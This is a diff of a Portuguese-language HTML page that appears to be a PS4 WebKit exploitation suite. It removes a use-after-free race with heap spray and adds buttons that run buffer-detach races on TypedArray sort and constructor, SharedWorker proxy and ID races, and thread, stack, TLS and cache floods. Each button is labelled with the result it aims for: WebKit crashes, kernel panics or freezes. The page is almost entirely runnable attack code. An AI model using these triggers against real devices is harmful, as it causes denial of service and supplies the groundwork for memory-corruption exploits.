@@ -1,132 +1,487 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Worker UAF (Stable)</title>
-    
+    <title>PS4 Binary Suite</title>      
 </head>
 <body>
-    <h2>WEBKIT UAF STABILIZED</h2>
-    <p>Estratégia: UAF via Worker + Integer Spray (Evita Crash Imediato)</p>
-    
-    <button id="btnRun" onclick="startStableExploit()">INICIAR EXPLOIT (Tentar Leitura)</button>
-    <div id="console">Pronto. Clique para iniciar...</div>
+
+    <div class="section">
+        <h2>TESTES</h2>   
+       
+        
+        <button onclick="runSortDetach()">Worker Termination Signal Race(CRASH WEBKIT)</button>
+        <button onclick="runRedZoneBypass()">Stack Red Zone Bypass (KERNEL PANIC)</button>
+        <button onclick="runPthreadInternal()">Pthread Internal Memory Error Trigger (KERNEL PANIC)</button>
+        <button onclick="runTLSCrash()">scePthreadSetspecific Memory Error (FREEZE)</button>
+        <button onclick="runSharedProxyRace()">SharedWorkerThreadProxy C++ Race (KERNEL PANIC)</button>
+        <button onclick="runSharedProxyDestruct()">SharedWorkerProxy Destructor Race  (KERNEL PANIC)</button> 
+        <button onclick="runIDWrap()">SharedWorker ID Wraparound (KERNEL PANIC) </button>
+
+        <button onclick="runSortDetach()">TypedArray.sort Buffer Detach</button>
+        <button onclick="runCustomElementRace()">CustomElement Upgrade Race</button>            
+        <button onclick="runClassListStrcat()">DOMTokenList strcat Overflow</button>        
+        <button onclick="runFatalAlloc()">'FATAL: attempt' Allocator Trigger</button>        
+        <button onclick="runSysTmpFlood()">/system_tmp/ Overflow Trigger</button>  
+
+    <button onclick="runNeuterTest()">Buffer Neuter Check</button> 
+ <button onclick="runTypedArrayConstructor_Detach()">TypedArray Constructor Detach Read</button>  
+ 
+       
+       
+        
+    </div>
+
+    <div id="log"></div>
+    <div id="dummy"></div>
+    <div id="sandbox"></div>
 
     <script>
-        const logDiv = document.getElementById('console');
-        function log(msg, type = '') {
-            logDiv.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function log(msg) { 
+            const el = document.getElementById('log');
+            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        // Configuração
-        const UAF_SIZE = 0x800; // 2KB (Menor = Mais estável para alinhamento)
-        const SPRAY_PATTERN = 0x41414141; // 'AAAA' em Hex
-        var worker = null;
-
-        // Código do Worker
-        // Simplesmente recebe o buffer para causar o 'Detach'
-        const workerCode = `
-            onmessage = function(e) {
-                const ab = e.data;
-                // Mantém o buffer vivo por um milissegundo para garantir a transferência
-                setTimeout(() => { postMessage("PONG"); }, 1);
-            };
-        `;
-
-        async function startStableExploit() {
-            document.getElementById('btnRun').disabled = true;
-            log("Inicializando Worker...");
+         // --- 2. TypedArray.sort Buffer Detach ---
+        function runSortDetach() {
+            log("[WebKit] Iniciando Sort Detach...");
             
-            if (worker) worker.terminate();
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            worker = new Worker(URL.createObjectURL(blob));
-
-            log("Iniciando Race Loop (20 tentativas)...");
-
-            for (let attempt = 1; attempt <= 20; attempt++) {
-                // Feedback visual sem floodar
-                if(attempt % 5 === 0) log(`Tentativa ${attempt}/20...`);
-
-                let result = await runRaceIteration();
+            try {
+                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
+                const array = new Uint8Array(buffer);
                 
-                if (result) {
-                    log(`🛑 UAF SUCESSO! Memória Reutilizada!`, 'vuln');
-                    log(`Valor Lido: 0x${result.toString(16)}`, 'vuln');
-                    log("Isso prova que controlamos o ponteiro sem crashar.", 'success');
-                    return; // Para tudo
-                }
-
-                // Pequena pausa para estabilizar o GC
-                await new Promise(r => setTimeout(r, 100));
+                // Preenche
+                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
+                
+                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
+                
+                let detached = false;
+                
+                // O GOLPE: Função de comparação transfere o buffer
+                array.sort((a, b) => {
+                    if (!detached) {
+                        log("Comparador ativo. Transferindo buffer...");
+                        w.postMessage(buffer, [buffer]);
+                        detached = true;
+                    }
+                    return a - b;
+                });
+                
+                log("Sort finalizado (Seguro se não crashou).");
+                w.terminate();
+                
+            } catch(e) {
+                // TypeError é esperado em browsers corrigidos
+                log("Resultado: " + e.message);
             }
-
-            log("Falha. O buffer foi protegido ou o Race não alinhou.");
-            document.getElementById('btnRun').disabled = false;
         }
 
-        function runRaceIteration() {
-            return new Promise((resolve) => {
-                try {
-                    // 1. Buffer Vítima (Source)
-                    let srcBuffer = new ArrayBuffer(UAF_SIZE);
-                    let srcView = new DataView(srcBuffer);
-                    // Preenche com 0xBBBBBBBB para diferenciar do nosso spray (0xAAAA...)
-                    for(let i=0; i < UAF_SIZE; i+=4) srcView.setUint32(i, 0xBBBBBBBB, true);
-
-                    // 2. O Iterador Sabotador
-                    let iter = {
-                        [Symbol.iterator]() {
-                            let i = 0;
-                            return {
-                                next() {
-                                    i++;
-                                    
-                                    // GATILHO: Aos 25% da cópia, transferimos o buffer
-                                    // Ajuste este valor se continuar falhando (ex: UAF_SIZE / 2)
-                                    if (i === (UAF_SIZE / 4)) { 
-                                        worker.postMessage(srcBuffer, [srcBuffer]);
-                                        
-                                        // SPRAY DE INTEIROS (Seguro)
-                                        // Tentamos ocupar o lugar do buffer morto com números 0x41414141
-                                        // Isso não crasha se o navegador tentar ler como ponteiro ou int.
-                                        let spray = new Uint32Array(UAF_SIZE / 4);
-                                        spray.fill(SPRAY_PATTERN);
-                                    }
-                                    
-                                    // Se o buffer for desligado, retornamos um marcador de erro
-                                    if (srcBuffer.byteLength === 0) {
-                                        return { value: 0xDEADDEAD, done: false };
-                                    }
-                                    
-                                    return { value: 0, done: i >= (UAF_SIZE / 2) };
-                                }
-                            };
-                        }
-                    };
-
-                    // 3. Execução (TypedArray Constructor)
-                    // O navegador começa a criar o array consumindo 'iter'
-                    let res = new Uint32Array(iter);
-
-                    // 4. Verificação Pós-Execução
-                    for(let k=0; k < res.length; k++) {
-                        let val = res[k];
-                        
-                        // Se lermos 0x41414141 (nosso spray) onde deveria haver 0xBBBB... ou 0
-                        // Significa que lemos a memória que nós mesmos injetamos!
-                        if (val === SPRAY_PATTERN) {
-                            resolve(val);
-                            return;
-                        }
-                    }
-
-                } catch (e) {
-                    // Ignora erros de "Detached Buffer" pois são esperados
+        // --- 3. CustomElement Upgrade Race ---
+        function runCustomElementRace() {
+            log("[WebKit] Iniciando CustomElement Race...");
+            const name = "x-crash-" + Math.floor(Math.random()*10000);
+            
+            class XCrash extends HTMLElement {
+                constructor() {
+                    super();
+                    log("Construtor chamado. Destruindo...");
+                    // O GOLPE: O elemento está sendo criado (upgrade).
+                    // Nós o removemos do documento ou alteramos seu estado violentamente.
+                    this.remove();
+                    document.body.innerHTML = ""; // Destruição em massa
                 }
-                resolve(null);
+            }
+            
+            const el = document.createElement(name);
+            document.body.appendChild(el);
+            
+            // Define DEPOIS de criar (Upgrade)
+            log("Definindo elemento (Upgrade Trigger)...");
+            customElements.define(name, XCrash);
+        }
+
+        
+
+        // --- 5. DOMTokenList strcat Overflow ---
+        function runClassListStrcat() {
+            log("[WebKit] Atacando strcat via ClassList...");
+            const el = document.getElementById('dummy');
+            
+            try {
+                // DOMTokenList armazena classes como uma string única internamente separada por espaços
+                // Adicionar classes força concatenação (strcat)
+                const hugeClass = "cls_" + "X".repeat(50000);
+                
+                log("Concatenando 2000 classes gigantes...");
+                
+                // Adiciona massivamente para forçar realocação e concatenação
+                for(let i=0; i<2000; i++) {
+                    el.classList.add(hugeClass + i);
+                }
+                
+                // Força serialização (leitura da string completa)
+                const len = el.className.length;
+                log(`ClassList length: ${len} (Seguro).`);
+                
+                el.className = ""; // Limpa
+            } catch(e) {
+                log("Erro ClassList: " + e.message);
+            }
+        }
+
+        // --- 6. 'FATAL: attempt' Allocator Trigger ---
+        function runFatalAlloc() {
+            log("[WebKit] Tentando trigger Fatal Alloc...");
+            
+            try {
+                // Tenta alocações de borda (Edge Cases)
+                // ArrayBuffer máximo seguro é ~2GB-1 no 32bit ou mais no 64bit
+                // Tentamos valores que podem causar overflow de inteiro em cálculos internos
+                const sizes = [
+                    2147483647, // Max Int32
+                    2147483648, // Max Int32 + 1
+                    4294967295, // Max Uint32
+                    Number.MAX_SAFE_INTEGER
+                ];
+                
+                sizes.forEach(s => {
+                    try {
+                        const ab = new ArrayBuffer(s);
+                        log(`Alloc ${s} OK (Inesperado).`);
+                    } catch(e) {
+                        // RangeError é o esperado. Queremos o FATAL crash.
+                    }
+                });
+                
+                // Tenta via WebAssembly (limites diferentes)
+                if (window.WebAssembly) {
+                    new WebAssembly.Memory({initial: 65536}); // Max Pages (~4GB)
+                }
+                
+                log("Allocator stress concluído.");
+            } catch(e) {
+                log("Erro: " + e.message);
+            }
+        }
+
+        // --- 7. SharedWorkerThreadProxy C++ Race ---
+        function runSharedProxyRace() {
+            log("[WebKit] Atacando SharedWorkerThreadProxy...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    // Mantém o proxy ocupado serializando
+                    postMessage({data: new Array(10000).fill(1.1)});
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                const sw = new SharedWorker(url, "race_" + i);
+                sw.port.start();
+                sw.port.postMessage("ping");
+                
+                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
+                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
+                
+                // Força atividade no proxy
+                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
+                
+                i++;
+                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
+                if(i > 1000) clearInterval(interval);
+            }, 10);
+        }
+
+        // --- 8. /system_tmp/ Overflow Trigger ---
+        function runSysTmpFlood() {
+            log("[WebKit] Inundando /system_tmp/...");
+            
+            if (!window.caches) return log("Cache API off.");
+            
+            // Cria um payload grande (10MB)
+            const data = new Response(new ArrayBuffer(10 * 1024 * 1024));
+            let count = 0;
+            
+            caches.open('sys_tmp_killer').then(cache => {
+                const interval = setInterval(() => {
+                    // Grava ficheiros rapidamente. O sistema deve fazer flush para o disco (/system_tmp/)
+                    // quando a RAM encher.
+                    cache.put('/file_' + count, data.clone())
+                        .catch(e => log("Quota error (Bom): " + e.name));
+                    
+                    count++;
+                    if(count % 10 === 0) log(`Arquivos 10MB escritos: ${count}`);
+                    
+                    // Não paramos até erro de quota ou crash
+                }, 50);
             });
         }
+
+        // --- 9. SharedWorker ID Wraparound ---
+        function runIDWrap() {
+            log("[WebKit] Iniciando ID Wraparound...");
+            
+            const blob = new Blob([""], {type: "text/javascript"});
+            const url = URL.createObjectURL(blob);
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                // Cria e "esquece" workers rapidamente
+                // O WebKit incrementa um contador estático para cada novo Worker
+                // Se for um uint32, demora, mas se for uint16 ou tabela hash, colide rápido.
+                for(let i=0; i<50; i++) {
+                    new SharedWorker(url, "id_" + count + "_" + i);
+                }
+                
+                count += 50;
+                if(count % 1000 === 0) log(`IDs gerados: ${count}`);
+                
+                // Em um exploit real, tentaríamos reutilizar um ID antigo
+            }, 10);
+        }
+
+        // --- 10. SharedWorkerProxy Destructor Race ---
+        function runSharedProxyDestruct() {
+            log("[WebKit] Iniciando Proxy Destructor Race...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    const port = e.ports[0];
+                    // Bombardeia a porta de volta
+                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                const mc = new MessageChannel();
+                const sw = new SharedWorker(url, "race_" + i);
+                sw.port.postMessage("init", [mc.port2]);
+                
+                // Fecha a porta local imediatamente (lado do proxy)
+                // enquanto o worker bombardeia o outro lado
+                setTimeout(() => {
+                    sw.port.close(); // Tenta invalidar o proxy
+                    mc.port1.close();
+                }, Math.random() * 10);
+                
+                i++;
+                if (i % 50 === 0) log(`Proxies destruídos: ${i}`);
+                if (i > 500) clearInterval(interval);
+            }, 20);
+        }
+
+       
+
+        // --- 13. Worker Termination Signal Race ---
+        function runSignalRace() {
+            log("[KERNEL] Iniciando Signal Race...");
+            
+            const workerCode = `
+                onmessage = () => {
+                    // Loop infinito (bloqueia thread)
+                    while(true) {}
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            const workers = [];
+            
+            // Lança 10 workers bloqueados
+            for(let i=0; i<10; i++) {
+                const w = new Worker(url);
+                w.postMessage("start"); // Bloqueia o worker
+                workers.push(w);
+            }
+            
+            log("Workers bloqueados. Terminando e enviando mensagens...");
+            
+            // Race: Terminar vs Enviar Mensagem
+            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
+            workers.forEach(w => {
+                setTimeout(() => {
+                    w.terminate(); // Envia sinal
+                    // Tenta escrever no pipe de uma thread morta/morrendo
+                    try { w.postMessage("race"); } catch(e){}
+                }, 100);
+            });
+            
+            setTimeout(() => log("Race executada."), 2000);
+        }
+
+        // --- 14. Pthread Internal Memory Error Trigger ---
+        function runPthreadInternal() {
+            log("[KERNEL] Triggering Pthread Internal Error...");
+            
+            // Worker que cria e destroi SABs e usa Atomics
+            // O objetivo é corromper a estrutura interna da thread no Kernel
+            const workerCode = `
+                onmessage = (e) => {
+                    const sab = new SharedArrayBuffer(1024);
+                    const view = new Int32Array(sab);
+                    
+                    // Espera fantasma
+                    Atomics.wait(view, 0, 0, 1);
+                    
+                    // Suicídio rápido
+                    close();
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let count = 0;
+            // Criação/Destruição de threads em velocidade máxima
+            const interval = setInterval(() => {
+                for(let i=0; i<10; i++) {
+                    const w = new Worker(url);
+                    w.postMessage("die");
+                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
+                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
+                }
+                count += 10;
+                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
+                
+                if (count > 20000) {
+                    clearInterval(interval);
+                    log("Pthread stress finalizado.");
+                }
+            }, 10);
+        }
+
+        // --- 15. scePthreadSetspecific Memory Error ---
+        function runTLSCrash() {
+            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
+            
+            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
+            const workerCode = `
+                onmessage = () => {
+                    try {
+                        const formatters = [];
+                        // Cria milhares de formatadores únicos
+                        // Cada um pode alocar slots no TLS ou heap associado à thread
+                        for(let i=0; i<5000; i++) {
+                            // Locale complexo para forçar alocação
+                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
+                        }
+                    } catch(e) {}
+                    // Morre com recursos alocados
+                    close(); 
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            // Ciclo rápido de criação/destruição de threads com carga de TLS
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
+                count += 10;
+                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
+                if (count > 10000) clearInterval(interval);
+            }, 50);
+        }
+
+        // --- 16. Stack Red Zone Bypass ---
+        function runRedZoneBypass() {
+            log("[KERNEL] Bypass Red Zone...");
+            
+            const workerCode = `
+                function deep(n) {
+                    const v = new Float64Array(128); // Usa stack
+                    if (n > 0) deep(n-1);
+                }
+                // Assim que nasce, consome stack
+                deep(500); 
+                postMessage("Done");
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            // Spawn flood
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i=0; i<20; i++) {
+                    new Worker(url).onmessage = () => {};
+                }
+                count += 20;
+                if(count > 2000) {
+                    clearInterval(interval);
+                    log("Red Zone Stress finalizado.");
+                }
+            }, 10);
+        }
+function runNeuterTest() {
+            try {
+                log("[*] Criando ArrayBuffer de 1MB...", "info");
+                var buffer = new ArrayBuffer(1024 * 1024);
+                
+                log("[*] Tamanho inicial: " + buffer.byteLength + " bytes", "info");
+
+                // Tentativa de Neutering via postMessage (Transferable Objects)
+                // Isso diz ao navegador: "Mande esse buffer para você mesmo e APAGUE a referência antiga".
+                try {
+                    log("[*] Tentando transferir/desalocar via postMessage...", "info");
+                    window.postMessage("teste", "*", [buffer]);
+                } catch(e) {
+                    log("[-] postMessage falhou ou não suporta transferencia: " + e.message, "safe");
+                }
+
+                // Verificação (Check)
+                // Se byteLength for 0, o buffer foi "destacado" (detached/neutered).
+                // Isso e essencial para exploits de UAF.
+                setTimeout(() => {
+                    if (buffer.byteLength === 0) {
+                        log("[+] SUCESSO: Buffer foi desalocado (Neutered)!", "vuln");
+                        log("Isso confirma que podemos criar condicoes de corrida (Race Conditions).", "vuln");
+                    } else {
+                        log("[-] SEGURO: Buffer continua valido (" + buffer.byteLength + " bytes).", "safe");
+                        log("O firmware impediu a desalocação simples.", "safe");
+                    }
+                }, 100);
+
+            } catch(e) {
+                log("Erro Fatal: " + e.message, "safe");
+            }
+        }
+        // --- TESTE 3: TypedArray Constructor Detach Read ---
+        // (Originalmente nomeado runTypedArrayConstructor no arquivo fonte, renomeado para evitar conflito com o Teste 4)
+        function runTypedArrayConstructor_Detach() {
+            try {
+                const src = new Uint8Array(1024);
+                src.fill(0x41); // 'A'
+                
+                const iter = {
+                    [Symbol.iterator]() {
+                        let i = 0;
+                        return {
+                            next: () => {
+                                i++;
+                                if (i === 2) {
+                                    // Detach no meio da cópia
+                                    try {
+                                        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
+                                        w.postMessage(src.buffer, [src.buffer]);
+                                    } catch(e){}
+                                }
+                                return { value: 0, done: i > 10 };
+                            }
+                        };
+                    }
+                };
+                
+                // Se o construtor continuar lendo após o detach, lê memória libertada
+                try {
+                    const res = new Uint8Array(iter);
+                    log("Construtor finalizou com buffer desligado (Potencial UAF).", "info");
+                } catch(e) {
+                    if (e.name === 'TypeError') log("Detach detetado e bloqueado.", "safe");
+                    else log("Erro: " + e.message, "safe");
+                }
+            } catch(e) { log("Erro Fatal: " + e.message, "safe"); }
+        }
+
     </script>
 </body>
 </html>
